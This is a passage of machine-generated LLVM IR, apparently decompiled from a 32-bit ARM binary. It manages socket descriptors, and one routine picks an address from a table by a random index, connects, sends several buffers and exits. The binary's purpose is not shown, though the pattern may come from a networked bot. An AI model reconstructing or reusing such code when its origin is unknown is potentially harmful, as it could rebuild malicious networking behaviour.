  %v0_13940.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13940.pr, label %dec_label_pc_13170, label %.dec_label_pc_13944_crit_edge

.dec_label_pc_13944_crit_edge:                    ; preds = %bb343
  %v0_13944.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13944

dec_label_pc_13944:                               ; preds = %.dec_label_pc_13944_crit_edge, %dec_label_pc_13934
  %v0_13944 = phi i32 [ %v0_13944.pre, %.dec_label_pc_13944_crit_edge ], [ %v4_13934, %dec_label_pc_13934 ]
  %v2_13944 = icmp ugt i32 %v0_13944, 250
  store i1 %v2_13944, i1* %cpsr_c.global-to-local, align 1
  %v7_13944 = icmp eq i32 %v0_13944, 251
  store i1 %v7_13944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13944, label %bb344, label %dec_label_pc_13170

bb344:                                            ; preds = %dec_label_pc_13944
  %v1_13948 = load i32, i32* %sl.global-to-local, align 4
  %v2_13948 = trunc i32 %v1_13948 to i8
  %v3_13948 = load i32, i32* @r4, align 4
  %v4_13948 = add i32 %v3_13948, -1
  %v5_13948 = inttoptr i32 %v4_13948 to i8*
  store i8 %v2_13948, i8* %v5_13948, align 1
  br label %dec_label_pc_13170

dec_label_pc_13950:                               ; preds = %dec_label_pc_136e4
  store i32 %v1_13720, i32* %r0.global-to-local, align 4
  %v0_13958 = load i32, i32* @r5, align 4
  %v1_13958 = add i32 %v0_13958, 4
  %v2_13958 = inttoptr i32 %v1_13958 to i32*
  %v3_13958 = load i32, i32* %v2_13958, align 4
  store i32 %v3_13958, i32* %r0.global-to-local, align 4
  %v1_1395c = call i32 @_close(i32 %v3_13958)
  store i32 %v1_1395c, i32* %r0.global-to-local, align 4
  %v0_13960 = load i32, i32* @r5, align 4
  %v1_13960 = add i32 %v0_13960, 284
  %v2_13960 = inttoptr i32 %v1_13960 to i8*
  %v3_13960 = load i8, i8* %v2_13960, align 1
  %v4_13960 = zext i8 %v3_13960 to i32
  %v1_13964 = add nuw nsw i32 %v4_13960, 1
  %v1_13968 = urem i32 %v1_13964, 256
  store i32 %v1_13968, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_13970 = icmp ugt i32 %v1_13968, 9
  store i1 %v2_13970, i1* %cpsr_c.global-to-local, align 1
  %v7_13970 = icmp eq i32 %v1_13968, 10
  store i1 %v7_13970, i1* %cpsr_z.global-to-local, align 1
  %v2_13974 = add i32 %v0_13960, 4
  %v3_13974 = inttoptr i32 %v2_13974 to i32*
  store i32 -1, i32* %v3_13974, align 4
  %v0_13978 = load i32, i32* %r3.global-to-local, align 4
  %v1_13978 = trunc i32 %v0_13978 to i8
  %v2_13978 = load i32, i32* @r5, align 4
  %v3_13978 = add i32 %v2_13978, 284
  %v4_13978 = inttoptr i32 %v3_13978 to i8*
  store i8 %v1_13978, i8* %v4_13978, align 1
  %v0_1397c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13980 = load i32, i32* @r5, align 4
  br i1 %v0_1397c, label %dec_label_pc_13980, label %dec_label_pc_13a68

dec_label_pc_13980:                               ; preds = %dec_label_pc_13950
  %v1_13980 = add i32 %v0_13980, 24
  %v2_13980 = inttoptr i32 %v1_13980 to i32*
  %v3_13980 = load i32, i32* %v2_13980, align 4
  store i32 %v3_13980, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @r7, align 4
  %v3_13990 = add i32 %v0_13980, 284
  %v4_13990 = inttoptr i32 %v3_13990 to i8*
  store i8 0, i8* %v4_13990, align 1
  %v0_13994 = load i32, i32* %r1.global-to-local, align 4
  %v1_13994 = load i32, i32* @r5, align 4
  %v2_13994 = add i32 %v1_13994, 12
  %v3_13994 = inttoptr i32 %v2_13994 to i32*
  store i32 %v0_13994, i32* %v3_13994, align 4
  br label %dec_label_pc_13818

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13064
  br i1 %v2_1308c, label %dec_label_pc_13abc, label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_1399c
  %v3_139a0 = icmp eq i32 %v4_13088, -1
  store i1 %v3_139a0, i1* %cpsr_c.global-to-local, align 1
  %v8_139a0 = icmp eq i32 %v4_13088, -1
  store i1 %v8_139a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_139a0, label %dec_label_pc_139a8, label %dec_label_pc_130b4

dec_label_pc_139a8:                               ; preds = %dec_label_pc_139a0
  store i32 %stack_var_-1868.0, i32* %r2.global-to-local, align 4
  %v2_139ac = load i32, i32* %v2_1306c, align 4
  store i32 %v2_139ac, i32* %r3.global-to-local, align 4
  %v2_139b0 = icmp ugt i32 %v2_139ac, 10
  store i1 %v2_139b0, i1* %cpsr_c.global-to-local, align 1
  %v7_139b0 = icmp eq i32 %v2_139ac, 11
  store i1 %v7_139b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_139b0, label %dec_label_pc_12ee4, label %dec_label_pc_139b8

dec_label_pc_139b8:                               ; preds = %dec_label_pc_139a8, %dec_label_pc_13abc
  %v0_139b8 = load i32, i32* @r5, align 4
  %v1_139b8 = add i32 %v0_139b8, 4
  %v2_139b8 = inttoptr i32 %v1_139b8 to i32*
  %v3_139b8 = load i32, i32* %v2_139b8, align 4
  store i32 %v3_139b8, i32* %r0.global-to-local, align 4
  %v1_139bc = call i32 @_close(i32 %v3_139b8)
  store i32 %v1_139bc, i32* %r0.global-to-local, align 4
  %v0_139c0 = load i32, i32* @r5, align 4
  %v1_139c0 = add i32 %v0_139c0, 284
  %v2_139c0 = inttoptr i32 %v1_139c0 to i8*
  %v3_139c0 = load i8, i8* %v2_139c0, align 1
  %v4_139c0 = zext i8 %v3_139c0 to i32
  %v1_139c4 = add nuw nsw i32 %v4_139c0, 1
  %v1_139c8 = urem i32 %v1_139c4, 256
  store i32 %v1_139c8, i32* %r3.global-to-local, align 4
  %v2_139cc = icmp ugt i32 %v1_139c8, 8
  store i1 %v2_139cc, i1* %cpsr_c.global-to-local, align 1
  %v7_139cc = icmp eq i32 %v1_139c8, 9
  store i1 %v7_139cc, i1* %cpsr_z.global-to-local, align 1
  %v1_139d0 = trunc i32 %v1_139c4 to i8
  store i8 %v1_139d0, i8* %v2_139c0, align 1
  store i32 -1, i32* @r4, align 4
  %v0_139d8 = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_139d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v2_139d8 = xor i1 %v1_139d8, true
  %v3_139d8 = and i1 %v0_139d8, %v2_139d8
  br i1 %v3_139d8, label %bb345, label %.thread217

.thread217:                                       ; preds = %dec_label_pc_139b8
  %v1_139dc213218 = load i32, i32* @r5, align 4
  %v2_139dc214219 = add i32 %v1_139dc213218, 4
  %v3_139dc215220 = inttoptr i32 %v2_139dc214219 to i32*
  store i32 -1, i32* %v3_139dc215220, align 4
  br label %bb346

bb345:                                            ; preds = %dec_label_pc_139b8
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_139dc209 = load i32, i32* @r5, align 4
  %v2_139dc210 = add i32 %v1_139dc209, 4
  %v3_139dc211 = inttoptr i32 %v2_139dc210 to i32*
  store i32 -1, i32* %v3_139dc211, align 4
  %v4_139e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_139e0 = load i32, i32* @r5, align 4
  %v6_139e0 = add i32 %v5_139e0, 12
  %v7_139e0 = inttoptr i32 %v6_139e0 to i32*
  store i32 %v4_139e0, i32* %v7_139e0, align 4
  %v4_139e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_139e4 = trunc i32 %v4_139e4 to i8
  %v6_139e4 = load i32, i32* @r5, align 4
  %v7_139e4 = add i32 %v6_139e4, 284
  %v8_139e4 = inttoptr i32 %v7_139e4 to i8*
  store i8 %v5_139e4, i8* %v8_139e4, align 1
  %v0_139e8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_139e8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb346

bb346:                                            ; preds = %.thread217, %bb345
  %v1_139e8 = phi i1 [ %v1_139e8.pre, %bb345 ], [ %v1_139d8, %.thread217 ]
  %v0_139e8 = phi i1 [ %v0_139e8.pre, %bb345 ], [ %v0_139d8, %.thread217 ]
  %v2_139e8 = xor i1 %v1_139e8, true
  %v3_139e8 = and i1 %v0_139e8, %v2_139e8
  br i1 %v3_139e8, label %dec_label_pc_12ee4, label %dec_label_pc_139ec

dec_label_pc_139ec:                               ; preds = %bb346
  %v0_139ec = load i32, i32* @r5, align 4
  store i32 %v0_139ec, i32* @r0, align 4
  %v0_139f0 = call i32 @function_12020()
  store i32 %v0_139f0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12ee4

dec_label_pc_139f8:                               ; preds = %dec_label_pc_133a8, %dec_label_pc_13384, %dec_label_pc_133c4
  store i32 %v3_13384, i32* %r1.global-to-local, align 4
  %v0_139fc = load i32, i32* @sb, align 4
  store i32 %v0_139fc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_151ac.392 to i32), i32* %r2.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v5_13a08 = call i32 @function_146d0(i32 %v0_139fc, i32 %v3_13384, i32 ptrtoint ([8 x i8]* @global_var_151ac.392 to i32), i32 7)
  store i32 %v5_13a08, i32* %r0.global-to-local, align 4
  %v3_13a0c = icmp eq i32 %v5_13a08, -1
  store i1 %v3_13a0c, i1* %cpsr_c.global-to-local, align 1
  %v8_13a0c = icmp eq i32 %v5_13a08, -1
  store i1 %v8_13a0c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_13a08, i32* @r7, align 4
  br i1 %v3_13a0c, label %dec_label_pc_13048.loopexit, label %dec_label_pc_133d0

dec_label_pc_13a1c:                               ; preds = %dec_label_pc_13928
  store i32 %v2_13114, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_13a28 = add i32 %v0_13914, 4
  %v2_13a28 = inttoptr i32 %v1_13a28 to i32*
  %v3_13a28 = load i32, i32* %v2_13a28, align 4
  store i32 %v3_13a28, i32* %r0.global-to-local, align 4
  %v4_13a2c = call i32 @_send(i32 %v3_13a28, i32 %v2_13114, i32 3, i32 16384)
  store i32 %v4_13a2c, i32* %r0.global-to-local, align 4
  store i32 %v2_13900, i32* %r1.global-to-local, align 4
  %v0_13a34 = load i32, i32* @r5, align 4
  %v1_13a34 = add i32 %v0_13a34, 4
  %v2_13a34 = inttoptr i32 %v1_13a34 to i32*
  %v3_13a34 = load i32, i32* %v2_13a34, align 4
  store i32 %v3_13a34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_131ac

dec_label_pc_13a44:                               ; preds = %dec_label_pc_13054
  store i32 %.pre, i32* %r0.global-to-local, align 4
  %v1_13a4c = add i32 %v0_13a44, 92
  store i32 %v1_13a4c, i32* %r1.global-to-local, align 4
  store i32 192, i32* %r2.global-to-local, align 4
  %v3_13a54 = call i32 @_memmove(i32 %.pre, i32 %v1_13a4c, i32 192)
  store i32 %v3_13a54, i32* %r0.global-to-local, align 4
  %v0_13a58 = load i32, i32* @r5, align 4
  %v1_13a58 = add i32 %v0_13a58, 24
  %v2_13a58 = inttoptr i32 %v1_13a58 to i32*
  %v3_13a58 = load i32, i32* %v2_13a58, align 4
  store i32 %v3_13a58, i32* %r3.global-to-local, align 4
  %v1_13a5c = add i32 %v3_13a58, -64
  store i32 %v1_13a5c, i32* %ip.global-to-local, align 4
  store i32 %v1_13a5c, i32* %v2_13a58, align 4
  br label %dec_label_pc_13064

dec_label_pc_13a68:                               ; preds = %dec_label_pc_13950
  store i32 %v0_13980, i32* @r0, align 4
  %v0_13a6c = call i32 @function_12020()
  store i32 %v0_13a6c, i32* %r0.global-to-local, align 4
  %v0_13a70 = load i32, i32* @r5, align 4
  %v1_13a70 = add i32 %v0_13a70, 24
  %v2_13a70 = inttoptr i32 %v1_13a70 to i32*
  %v3_13a70 = load i32, i32* %v2_13a70, align 4
  store i32 %v3_13a70, i32* %ip.global-to-local, align 4
  %v0_13a74 = load i32, i32* @r4, align 4
  store i32 %v0_13a74, i32* @r7, align 4
  br label %dec_label_pc_13818

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_12e3c, %dec_label_pc_12e20
  %v0_13a7c = load i32, i32* @r7, align 4
  %v1_13a7c = load i32, i32* @r4, align 4
  %v2_13a7c = add i32 %v1_13a7c, 12
  %v3_13a7c = inttoptr i32 %v2_13a7c to i32*
  store i32 %v0_13a7c, i32* %v3_13a7c, align 4
  %v0_13a80 = load i32, i32* @r7, align 4
  %v1_13a80 = trunc i32 %v0_13a80 to i8
  %v2_13a80 = load i32, i32* @r4, align 4
  %v3_13a80 = add i32 %v2_13a80, 284
  %v4_13a80 = inttoptr i32 %v3_13a80 to i8*
  store i8 %v1_13a80, i8* %v4_13a80, align 1
  br label %bb309

dec_label_pc_13a88:                               ; preds = %dec_label_pc_12fc8, %dec_label_pc_12f80
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13a8c

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_12ff0, %dec_label_pc_13a88
  %v0_13a94 = phi i32 [ 0, %dec_label_pc_13a88 ], [ %v0_12fd0, %dec_label_pc_12ff0 ]
  %v0_13a8c = load i32, i32* @r5, align 4
  %v1_13a8c = add i32 %v0_13a8c, 4
  %v2_13a8c = inttoptr i32 %v1_13a8c to i32*
  %v3_13a8c = load i32, i32* %v2_13a8c, align 4
  store i32 %v3_13a8c, i32* %r4.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_13a94 = inttoptr i32 %v0_13a8c to i32*
  store i32 %v0_13a94, i32* %v2_13a94, align 4
  %v0_13a98 = load i32, i32* %ip.global-to-local, align 4
  %v1_13a98 = load i32, i32* @r5, align 4
  %v2_13a98 = add i32 %v1_13a98, 24
  %v3_13a98 = inttoptr i32 %v2_13a98 to i32*
  store i32 %v0_13a98, i32* %v3_13a98, align 4
  %v0_12ec0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ec0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_12f40
  %v0_13aa0 = load i32, i32* @r5, align 4
  %v1_13aa0 = add i32 %v0_13aa0, 4
  %v2_13aa0 = inttoptr i32 %v1_13aa0 to i32*
  %v3_13aa0 = load i32, i32* %v2_13aa0, align 4
  store i32 %v3_13aa0, i32* %r0.global-to-local, align 4
  %v1_13aa4 = call i32 @_close(i32 %v3_13aa0)
  store i32 %v1_13aa4, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v0_13aac = load i32, i32* @r6, align 4
  %v1_13aac = load i32, i32* @r5, align 4
  %v2_13aac = add i32 %v1_13aac, 12
  %v3_13aac = inttoptr i32 %v2_13aac to i32*
  store i32 %v0_13aac, i32* %v3_13aac, align 4
  %v0_13ab0 = load i32, i32* %r4.global-to-local, align 4
  %v1_13ab0 = load i32, i32* @r5, align 4
  %v2_13ab0 = add i32 %v1_13ab0, 4
  %v3_13ab0 = inttoptr i32 %v2_13ab0 to i32*
  store i32 %v0_13ab0, i32* %v3_13ab0, align 4
  %v0_13ab4 = load i32, i32* @r6, align 4
  %v1_13ab4 = trunc i32 %v0_13ab4 to i8
  %v2_13ab4 = load i32, i32* @r5, align 4
  %v3_13ab4 = add i32 %v2_13ab4, 284
  %v4_13ab4 = inttoptr i32 %v3_13ab4 to i8*
  store i8 %v1_13ab4, i8* %v4_13ab4, align 1
  br label %dec_label_pc_12ee4

dec_label_pc_13abc:                               ; preds = %dec_label_pc_1399c
  store i32 %stack_var_-1868.0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 104, i32* %v2_1306c, align 4
  br label %dec_label_pc_139b8

dec_label_pc_13acc:                               ; preds = %dec_label_pc_137d4
  store i32 2, i32* @r5, align 4
  %v1_13ad0 = add i32 %v2_137f0, 4
  %v2_13ad0 = inttoptr i32 %v1_13ad0 to i32*
  %v3_13ad0 = load i32, i32* %v2_13ad0, align 4
  store i32 %v3_13ad0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v0_13adc = call i32 @function_117dc()
  store i32 %v0_13adc, i32* %r0.global-to-local, align 4
  %v0_13ae0 = load i32, i32* @r8, align 4
  %v1_13ae0 = inttoptr i32 %v0_13ae0 to i8*
  %v2_13ae0 = load i8, i8* %v1_13ae0, align 1
  %v3_13ae0 = zext i8 %v2_13ae0 to i32
  store i32 %v3_13ae0, i32* %r1.global-to-local, align 4
  %v2_13ae4 = urem i32 %v0_13adc, %v3_13ae0
  store i32 %v2_13ae4, i32* %r0.global-to-local, align 4
  %v0_13ae8 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_13ae8 = mul nuw nsw i32 %v2_13ae4, 4
  %v5_13ae8 = add i32 %v0_13ae8, %v4_13ae8
  %v6_13ae8 = inttoptr i32 %v5_13ae8 to i32*
  %v7_13ae8 = load i32, i32* %v6_13ae8, align 4
  store i32 %v7_13ae8, i32* %r3.global-to-local, align 4
  %v0_13aec = load i32, i32* @sl, align 4
  store i32 %v0_13aec, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r0.global-to-local, align 4
  %v2_13af8 = inttoptr i32 %v0_13aec to i32*
  %v3_13af8 = call i32 @function_13c04(i32 19, i32* %v2_13af8)
  %v4_13af8 = inttoptr i32 %v3_13af8 to i8*
  store i32 %v3_13af8, i32* %r0.global-to-local, align 4
  %v2_13afc = add i32 %v3_13af8, 1
  %v3_13afc = inttoptr i32 %v2_13afc to i8*
  %v4_13afc = load i8, i8* %v3_13afc, align 1
  %v5_13afc = zext i8 %v4_13afc to i32
  store i32 %v5_13afc, i32* %r2.global-to-local, align 4
  %v3_13b00 = load i8, i8* %v4_13af8, align 1
  %v4_13b00 = zext i8 %v3_13b00 to i32
  %v4_13b04 = mul nuw nsw i32 %v5_13afc, 256
  %v5_13b04 = or i32 %v4_13b00, %v4_13b04
  store i32 %v5_13b04, i32* %r3.global-to-local, align 4
  %v1_13b08 = and i32 %v4_13b00, 128
  %v2_13b08 = icmp ne i32 %v1_13b08, 0
  store i1 %v2_13b08, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_13afc, i32* %r1.global-to-local, align 4
  %v0_13b0c = load i32, i32* @r8, align 4
  store i32 %v0_13b0c, i32* %r0.global-to-local, align 4
  %v2_13b18 = sext i8 %v4_13afc to i32
  %v7_13b18 = call i32 @function_11a9c(i32 %v0_13b0c, i32 %v2_13b18)
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_13b20 = call i32 @function_13c30(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_13b28 = call i32 @function_13c30(i32 19)
  %v0_13b30 = load i32, i32* @r6, align 4
  store i32 %v0_13b30, i32* %r0.global-to-local, align 4
  %v2_13b34 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_13b34, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_13b3c = call i32 @_connect(i32 %v0_13b30, i32 %v2_13b34, i32 16)
  store i32 %v3_13b3c, i32* %r0.global-to-local, align 4
  %v3_13b40 = icmp eq i32 %v3_13b3c, -1
  store i1 %v3_13b40, i1* %cpsr_c.global-to-local, align 1
  %v8_13b40 = icmp eq i32 %v3_13b3c, -1
  store i1 %v8_13b40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13b40, label %dec_label_pc_13b48, label %dec_label_pc_13b58

dec_label_pc_13b48:                               ; preds = %dec_label_pc_13acc
  %v0_13b48 = load i32, i32* @r6, align 4
  store i32 %v0_13b48, i32* %r0.global-to-local, align 4
  %v1_13b4c = call i32 @_close(i32 %v0_13b48)
  %v0_13b50 = load i32, i32* @sl, align 4
  store i32 %v0_13b50, i32* %r0.global-to-local, align 4
  %v1_13b54 = call i32 @_exit(i32 %v0_13b50)
  store i32 %v1_13b54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13b58

dec_label_pc_13b58:                               ; preds = %dec_label_pc_13acc, %dec_label_pc_13b48
  store i32 %v2_1347c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13b68 = load i32, i32* @r6, align 4
  store i32 %v0_13b68, i32* %r0.global-to-local, align 4
  %v0_13b6c = load i32, i32* @sl, align 4
  store i32 %v0_13b6c, i32* %stack_var_-56, align 4
  %v5_13b70 = call i32 @_send(i32 %v0_13b68, i32 %v2_1347c, i32 1, i32 16384)
  store i32 %v2_13530, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13b84 = load i32, i32* @r6, align 4
  store i32 %v0_13b84, i32* %r0.global-to-local, align 4
  %v4_13b88 = call i32 @_send(i32 %v0_13b84, i32 %v2_13530, i32 4, i32 16384)
  %v0_13b90 = load i32, i32* @r5, align 4
  store i32 %v0_13b90, i32* %r2.global-to-local, align 4
  %v2_13b94 = ptrtoint i32* %stack_var_-38 to i32
  store i32 %v2_13b94, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13b9c = load i32, i32* @r6, align 4
  store i32 %v0_13b9c, i32* %r0.global-to-local, align 4
  %v4_13ba0 = call i32 @_send(i32 %v0_13b9c, i32 %v2_13b94, i32 %v0_13b90, i32 16384)
  %v0_13ba4 = load i32, i32* @fp, align 4
  %v1_13ba4 = add i32 %v0_13ba4, 12
  store i32 %v1_13ba4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13bb0 = load i32, i32* @r6, align 4
  store i32 %v0_13bb0, i32* %r0.global-to-local, align 4
  %v4_13bb4 = call i32 @_send(i32 %v0_13bb0, i32 %v1_13ba4, i32 1, i32 16384)
  store i32 %v4_13bb4, i32* %r0.global-to-local, align 4
  %v0_13bb8 = load i32, i32* @fp, align 4
  %v1_13bb8 = inttoptr i32 %v0_13bb8 to i32*
  %v2_13bb8 = load i32, i32* %v1_13bb8, align 4
  store i32 %v2_13bb8, i32* %r1.global-to-local, align 4
  %v1_13bbc = add i32 %v0_13bb8, 12
  %v2_13bbc = inttoptr i32 %v1_13bbc to i8*
  %v3_13bbc = load i8, i8* %v2_13bbc, align 1
  %v4_13bbc = zext i8 %v3_13bbc to i32
  store i32 %v4_13bbc, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13bc4 = load i32, i32* @r6, align 4
  store i32 %v0_13bc4, i32* %r0.global-to-local, align 4
  %v4_13bc8 = call i32 @_send(i32 %v0_13bc4, i32 %v2_13bb8, i32 %v4_13bbc, i32 16384)
  %v0_13bcc = load i32, i32* @fp, align 4
  %v1_13bcc = add i32 %v0_13bcc, 13
  store i32 %v1_13bcc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_13bd8 = load i32, i32* @r6, align 4
  store i32 %v0_13bd8, i32* %r0.global-to-local, align 4
  %v4_13bdc = call i32 @_send(i32 %v0_13bd8, i32 %v1_13bcc, i32 1, i32 16384)
  %v0_13be0 = load i32, i32* @r6, align 4
  store i32 %v0_13be0, i32* %r0.global-to-local, align 4
  %v0_13be4 = load i32, i32* @fp, align 4
  %v1_13be4 = add i32 %v0_13be4, 13
  %v2_13be4 = inttoptr i32 %v1_13be4 to i8*
  %v3_13be4 = load i8, i8* %v2_13be4, align 1
  %v4_13be4 = zext i8 %v3_13be4 to i32
  store i32 %v4_13be4, i32* %r2.global-to-local, align 4
  %v1_13be8 = add i32 %v0_13be4, 4
  %v2_13be8 = inttoptr i32 %v1_13be8 to i32*
  %v3_13be8 = load i32, i32* %v2_13be8, align 4
  store i32 %v3_13be8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_13bf0 = call i32 @_send(i32 %v0_13be0, i32 %v3_13be8, i32 %v4_13be4, i32 16384)
  %v0_13bf4 = load i32, i32* @r6, align 4
  store i32 %v0_13bf4, i32* %r0.global-to-local, align 4
  %v1_13bf8 = call i32 @_close(i32 %v0_13bf4)
  store i32 %v1_13bf8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13bfc

dec_label_pc_13bfc:                               ; preds = %dec_label_pc_137b8, %dec_label_pc_13b58
  %v0_13bfc = load i32, i32* @sl, align 4
  store i32 %v0_13bfc, i32* %r0.global-to-local, align 4
  %v1_13c00 = call i32 @_exit(i32 %v0_13bfc)
  store i32 %v1_13c00, i32* %r0.global-to-local, align 4
  ret i32 %v1_13c00

; uselistorder directives
  uselistorder i32 %v4_13b00, { 1, 0 }
  uselistorder i32 %v5_13afc, { 1, 0, 2 }
  uselistorder i32 %v3_13a34, { 1, 0 }
  uselistorder i32 %v5_13a08, { 2, 0, 3, 4, 1 }
  uselistorder i1 %v1_139d8, { 1, 0 }
  uselistorder i32 %v1_139c8, { 2, 1, 0 }
  uselistorder i32 %v1_139c4, { 1, 0 }
  uselistorder i32 %v0_13980, { 1, 0, 2 }
  uselistorder i32 %v1_13968, { 2, 1, 0 }
  uselistorder i32 %v0_13914, { 1, 2, 0 }
  uselistorder i1 %v7_13888, { 1, 0 }
  uselistorder i32 %v1_13884, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_1387c, { 1, 0 }
  uselistorder i8 %v3_13874, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13884, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_13860, { 1, 0 }
  uselistorder i1 %v7_13858, { 1, 0 }
  uselistorder i1 %v7_13850, { 1, 0 }
  uselistorder i32 %v0_1382c, { 1, 2, 0 }
  uselistorder i32 %v2_13818, { 1, 0 }
  uselistorder i32 %v1_13818, { 1, 3, 0, 2, 4 }
  uselistorder i32 %v0_13818, { 3, 2, 5, 0, 1, 4, 6 }
  uselistorder i1 %v7_137c8, { 1, 0 }
  uselistorder i32 %v3_137c4, { 1, 0, 2, 3 }
  uselistorder i1 %v2_137b0, { 1, 0 }
  uselistorder i32 %.350, { 1, 0 }
  uselistorder i1 %v7_13798, { 1, 0 }
  uselistorder i32 %v0_13794, { 2, 1, 0, 3 }
  uselistorder i32 %v4_13774, { 1, 0, 2 }
  uselistorder i32 %v4_13770, { 1, 0, 2 }
  uselistorder i1 %v7_13760, { 1, 0 }
  uselistorder i32 %v0_13760, { 3, 2, 0, 4, 1 }
  uselistorder i1 %v7_1367c, { 1, 0 }
  uselistorder i32 %v1_13678, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_13670, { 1, 0 }
  uselistorder i8 %v3_13668, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13678, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_13654, { 1, 0 }
  uselistorder i1 %v7_1364c, { 1, 0 }
  uselistorder i1 %v7_13644, { 1, 0 }
  uselistorder i1 %v7_135c8, { 1, 0 }
  uselistorder i32 %v1_135c4, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_135bc, { 1, 0 }
  uselistorder i8 %v3_135b4, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_135c4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_135a0, { 1, 0 }
  uselistorder i1 %v7_13598, { 1, 0 }
  uselistorder i1 %v7_13590, { 1, 0 }
  uselistorder i1 %v7_13514, { 1, 0 }
  uselistorder i32 %v1_13510, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_13508, { 1, 0 }
  uselistorder i8 %v3_13500, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13510, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_134ec, { 1, 0 }
  uselistorder i1 %v7_134e4, { 1, 0 }
  uselistorder i1 %v7_134dc, { 1, 0 }
  uselistorder i1 %v7_13460, { 1, 0 }
  uselistorder i32 %v1_1345c, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v8_13454, { 1, 0 }
  uselistorder i8 %v3_1344c, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1345c, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_13438, { 1, 0 }
  uselistorder i1 %v7_13430, { 1, 0 }
  uselistorder i1 %v7_13428, { 1, 0 }
  uselistorder i32 %v0_133d0, { 2, 1, 0 }
  uselistorder i1 %v7_133c8, { 1, 0 }
  uselistorder i1 %v8_133bc, { 1, 0 }
  uselistorder i8 %v3_133b4, { 4, 5, 6, 7, 8, 3, 2, 1, 0 }
  uselistorder i32 %v0_133c4, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_133a0, { 1, 0 }
  uselistorder i1 %v7_13398, { 1, 0 }
  uselistorder i32 %v3_13384, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13240, { 2, 1, 0 }
  uselistorder i1 %v7_13238, { 1, 0 }
  uselistorder i1 %v8_1322c, { 1, 0 }
  uselistorder i8 %v3_13224, { 6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_13234, { 0, 1, 2, 4, 5, 3 }
  uselistorder i1 %v7_13210, { 1, 0 }
  uselistorder i1 %v7_13208, { 1, 0 }
